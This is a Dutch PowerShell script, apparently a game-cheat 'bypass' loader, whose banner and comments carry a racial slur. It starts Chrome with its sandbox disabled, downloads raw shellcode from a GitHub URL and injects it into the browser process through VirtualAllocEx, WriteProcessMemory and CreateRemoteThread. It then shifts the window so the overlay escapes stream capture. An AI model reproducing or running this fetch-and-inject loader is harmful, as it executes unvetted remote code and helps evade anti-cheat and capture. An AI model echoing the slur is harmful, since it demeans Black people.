# ================================================
# NIGGER BYPASS v7.6 - Chrome ZONDER Admin + stabiel
# Aangepast: Chrome start nu normaal (niet als Administrator)
# ================================================

Clear-Host
Write-Host ""
Write-Host " ----------------------------------------" -ForegroundColor Cyan
Write-Host " I I" -ForegroundColor Cyan
Write-Host " I NIGGER BYPASS v7.6 I" -ForegroundColor Cyan
Write-Host " I Gemaakt door: MJBP <3 I" -ForegroundColor Cyan
Write-Host " I I" -ForegroundColor Cyan
Write-Host " ----------------------------------------" -ForegroundColor Cyan
Write-Host ""

# ====================== KEUZE 1: STREAMPROOF OF NIET ======================
Write-Host "[1] Streamproof versie" -ForegroundColor Yellow
Write-Host "[2] Niet streamproof versie (sterker)" -ForegroundColor Yellow
$choice1 = Read-Host "Maak je keuze (1 of 2)"

if ($choice1 -eq "1") {
    $url = "https://raw.githubusercontent.com/MJ06-BP/bp/main/browser.bin"
    $useNvidiaBypass = $false
    Write-Host "[+] Streamproof shellcode geselecteerd" -ForegroundColor Green
}
elseif ($choice1 -eq "2") {
    $url = "https://raw.githubusercontent.com/MJ06-BP/bp/main/shellcode.bin"
    Write-Host "[+] Niet-streamproof shellcode geselecteerd" -ForegroundColor Magenta
   
    Write-Host ""
    Write-Host "[1] Ja, Nvidia Bypass gebruiken" -ForegroundColor Yellow
    Write-Host "[2] Nee, geen Nvidia Bypass" -ForegroundColor Yellow
    $nvidiaChoice = Read-Host "Wil je Nvidia Bypass? (1 of 2)"
    $useNvidiaBypass = ($nvidiaChoice -eq "1")
    if ($useNvidiaBypass) {
        Write-Host "[+] Nvidia Bypass ingeschakeld" -ForegroundColor Green
    } else {
        Write-Host "[+] Nvidia Bypass uitgeschakeld" -ForegroundColor Yellow
    }
}
else {
    Write-Host "[-] Ongeldige keuze!" -ForegroundColor Red
    pause; exit
}

# ====================== MONITOR KEUZE ======================
$MonitorX = 0
$Width = 1920
$Height = 1080
if ($useNvidiaBypass) {
    Write-Host ""
    Write-Host "[1] Tweede monitor staat LINKS" -ForegroundColor Yellow
    Write-Host "[2] Tweede monitor staat RECHTS" -ForegroundColor Yellow
    $monChoice = Read-Host "Maak je keuze (1 of 2)"
    if ($monChoice -eq "1") { $MonitorX = -1920 }
    elseif ($monChoice -eq "2") { $MonitorX = 1920 }
    else { Write-Host "[-] Ongeldige keuze!" -ForegroundColor Red; pause; exit }
    Write-Host "[+] Monitor ingesteld op X = $MonitorX" -ForegroundColor Green
}

# ====================== 64-BIT CHECK ======================
if (-not [Environment]::Is64BitProcess) {
    Write-Host "[-] Gebruik 64-bit PowerShell als Administrator!" -ForegroundColor Red
    pause; exit
}

# ====================== STABIELE NVIDIA BYPASS ======================
function Invoke-NvidiaBypass {
    param([int]$TargetPID, [int]$MonitorX = -1920, [int]$Width = 1920, [int]$Height = 1080)
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")] public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr hWnd);
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
}
"@ -ErrorAction SilentlyContinue

    $process = Get-Process -Id $TargetPID -ErrorAction SilentlyContinue
    if (-not $process) { Write-Host "[-] Proces niet gevonden" -ForegroundColor Red; return }

    $hwnd = $process.MainWindowHandle

    # Fallback als MainWindowHandle leeg is
    if ($hwnd -eq [IntPtr]::Zero) {
        $hwnd = [IntPtr]::Zero
        $callback = {
            param($hWnd, $lParam)
            $procId = 0
            [Win32]::GetWindowThreadProcessId($hWnd, [ref]$procId) | Out-Null
            if ($procId -eq $TargetPID) { $script:hwnd = $hWnd; return $false }
            return $true
        }
        $delegate = New-Object System.Func[IntPtr, IntPtr, bool] $callback
        [Win32]::EnumWindows($delegate, [IntPtr]::Zero) | Out-Null
    }

    if ($hwnd -eq [IntPtr]::Zero) {
        Write-Host "[-] Geen venster gevonden" -ForegroundColor Red
        return
    }

    Write-Host "[*] Venster verplaatsen naar X = $MonitorX (6x voor stabiliteit)..." -ForegroundColor Yellow
    [Win32]::SetForegroundWindow($hwnd) | Out-Null
    for ($i = 1; $i -le 6; $i++) {
        [Win32]::MoveWindow($hwnd, $MonitorX, 0, $Width, $Height, $true) | Out-Null
        Start-Sleep -Milliseconds 150
    }
    Write-Host "[+] Nvidia Bypass succesvol uitgevoerd" -ForegroundColor Green
}

# ====================== CHROME STARTEN (ZONDER ADMIN) ======================
Write-Host ""
Write-Host "[+] Chrome starten (normaal, zonder Administrator)..." -ForegroundColor Cyan

try {
    Start-Process "chrome.exe" -ArgumentList "--no-sandbox --start-maximized"
    Start-Sleep 5
} catch {
    Write-Host "[-] Kon Chrome niet starten. Zorg dat Chrome geïnstalleerd is en in je PATH staat." -ForegroundColor Red
    pause; exit
}

# Hoofdvenster kiezen
$targetProcess = Get-Process -Name "chrome" | Where-Object { $_.MainWindowTitle -ne "" } | Select-Object -First 1
if (-not $targetProcess) {
    Write-Host "[-] Geen venster met titel gevonden → laagste memory proces" -ForegroundColor Yellow
    $targetProcess = Get-Process -Name "chrome" | Sort-Object WorkingSet64 | Select-Object -First 1
}

$targetPID = $targetProcess.Id
Write-Host "[+] Chrome PID: $targetPID" -ForegroundColor Green

# ====================== VROEGE BYPASS ======================
if ($useNvidiaBypass) {
    Write-Host "[*] Vroege Nvidia Bypass (voor injectie)..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 2000
    Invoke-NvidiaBypass -TargetPID $targetPID -MonitorX $MonitorX
}

# ====================== SHELLCODE + INJECTIE ======================
try {
    $shellcode = (New-Object Net.WebClient).DownloadData($url)
    Write-Host "[+] Shellcode gedownload ($($shellcode.Length) bytes)" -ForegroundColor Green
} catch {
    Write-Host "[-] Download mislukt: $($_.Exception.Message)" -ForegroundColor Red
    pause; exit
}

$size = $shellcode.Length

Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
"@ -Name Win32 -Namespace Native -PassThru

try {
    $hProcess = [Native.Win32]::OpenProcess(0x001F0FFF, $false, $targetPID)
    if ($hProcess -eq [IntPtr]::Zero) { 
        throw "OpenProcess mislukt. Script moet als Administrator draaien!" 
    }

    $addr = [Native.Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, 0x3000, 0x40)
    $bytesWritten = [UIntPtr]::Zero
    [Native.Win32]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$size, [ref]$bytesWritten) | Out-Null
    [Native.Win32]::VirtualProtectEx($hProcess, $addr, [uint32]$size, 0x20, [ref]$null) | Out-Null
    [Native.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$null) | Out-Null

    Write-Host "[+] Injectie succesvol!" -ForegroundColor Green
}
catch {
    Write-Host "[-] Injectie mislukt: $($_.Exception.Message)" -ForegroundColor Red
    pause; exit
}
finally {
    if ($hProcess -ne [IntPtr]::Zero) { [Native.Win32]::CloseHandle($hProcess) | Out-Null }
}

# ====================== EXTRA BYPASS NA INJECTIE ======================
if ($useNvidiaBypass) {
    Start-Sleep -Milliseconds 2500
    Write-Host "[*] Extra Nvidia Bypass na injectie (overlay fix)..." -ForegroundColor Yellow
    Invoke-NvidiaBypass -TargetPID $targetPID -MonitorX $MonitorX
}

Write-Host ""
Write-Host "--------------------------------------------------------------------------------" -ForegroundColor Cyan
Write-Host "[!] Laat Chrome open staan!" -ForegroundColor Red
Write-Host "[-] Om te cleanen: druk op END of sluit Chrome helemaal af." -ForegroundColor Yellow
Write-Host "[+] Maak nu een nieuwe Instant Replay clip en kijk of de game zichtbaar is." -ForegroundColor Green
pause
